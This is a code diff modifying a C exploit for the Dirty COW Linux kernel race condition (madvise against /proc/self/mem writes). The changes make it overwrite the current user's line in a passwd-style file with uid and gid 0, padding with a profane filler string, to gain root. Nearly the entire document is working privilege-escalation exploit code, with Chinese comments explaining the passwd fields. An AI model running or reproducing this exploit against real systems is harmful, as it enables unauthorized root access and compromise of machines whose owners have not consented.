@@ -21,22 +21,24 @@ m00000000000000000
 #include <fcntl.h>
 #include <pthread.h>
 #include <string.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <pwd.h>
 #define ESC          "\033"
-#define LOOP 100000000
+#define LOOP 10000
  
 void *map;
 int f;
 struct stat st;
 char *name;
+int  curr_name_offset = 0;
 
 void *madviseThread(void *arg)
 {
   char *str;
   str=(char*)arg;
   int i,c=0;
-  for(i=0;i<100000000;i++)
+  for(i=0;i<LOOP;i++)
   {
 /*
 You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
@@ -64,14 +66,27 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
     /*
     * You have to reset the file pointer to the memory position.
     **/
-    lseek(f,map,SEEK_SET);
+    lseek(f,map+curr_name_offset,SEEK_SET);
     c+=write(f,str,strlen(str));
   }
-  if (c == LOOP * strlen(str)) {
-    printf (ESC "[33mprocself mem success" ESC "[0m\n");
-  }else {
-    printf (ESC "[31mprocself mem failed" ESC "[0m\n");
-  }
+}
+
+int
+get_pad_len()
+{
+  int             uid_gid_len;     
+  char            uid_gid_buf[100] = {'\0'};
+  uid_t           uid;
+  gid_t           gid;
+  int             pad_len;
+
+  uid = getuid();
+  gid = getgid();
+  sprintf(uid_gid_buf, "%ld%ld", uid, gid);
+  uid_gid_len = strlen(uid_gid_buf);
+  pad_len = uid_gid_len - 2;
+
+  return pad_len;
 }
  
 char*
@@ -79,13 +94,16 @@ change_root(char *name)
 {
   FILE            *fp;
   char            *curr_name;
-  char            buf[1024];
+  char            buf[1024] = {'\0'};
   char            tmpbuf[100] = {'\0'};
   struct passwd  *pwd;
-  char           *tab1, *tab2, *tab3, *tab4;
-  char            writen[102400];
+  char           *tab1, *tab2, *tab3; 
+  char           *tab4, *tab5, *tab6;
+  char            writen[102400] = {'\0'};
+  int             pad_len;
 
-  fp=fopen(name, "r");
+  
+  fp = fopen(name, "r");
   pwd = getpwuid(getuid());
   curr_name = pwd->pw_name;
   while (fgets(buf, 1024, fp)) {
@@ -97,17 +115,26 @@ change_root(char *name)
           tab2 = strchr(tab1 + 1, ':');
           tab3 = strchr(tab2 + 1, ':');
           tab4 = strchr(tab3 + 1, ':');
+          tab5 = strchr(tab4 + 1, ':');
+          tab6 = strchr(tab5 + 1, ':');
           strcat(mod_buf, ":x:0:0");
-          strcat(mod_buf, tab4);
-
-          strcat(writen, mod_buf);
+          //用户名描述
+          strncat(mod_buf, tab4, tab5-tab4);
+          pad_len = get_pad_len();
+          //填充uid和gid覆盖的字节数
+          strncat(mod_buf, "fuckfuckfuckfuckfuck", pad_len);
+          //用户登陆跳转目录
+          strncat(mod_buf, tab5, tab6-tab5);
+          //用户使用shell
+          strcat(mod_buf, tab6);
+          return strdup(mod_buf);
       } else {
-          strcat(writen, buf);
-      }
+          curr_name_offset += strlen(buf);
+      } 
       memset(tmpbuf, '\0', 100);
+      memset(buf, '\0', 1024);
   }
-
-  return strdup(writen);
+  return NULL;
 }
 
  
@@ -116,6 +143,7 @@ int main(int argc,char *argv[])
 /*
 You have to pass two arguments. File and Contents.
 */
+  char *writen;
   if (argc<2)return 1;
   pthread_t pth1,pth2;
 /*
@@ -136,7 +164,10 @@ You have to use MAP_PRIVATE for copy-on-write mapping.
 /*
 You have to open with PROT_READ.
 */
-  char *writen = change_root(name);
+  if ((writen  = change_root(name)) == NULL) {
+      printf("current name not exist");
+      exit(0);
+  }
   map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
   printf("mmap %x\n\n",map);
 /*
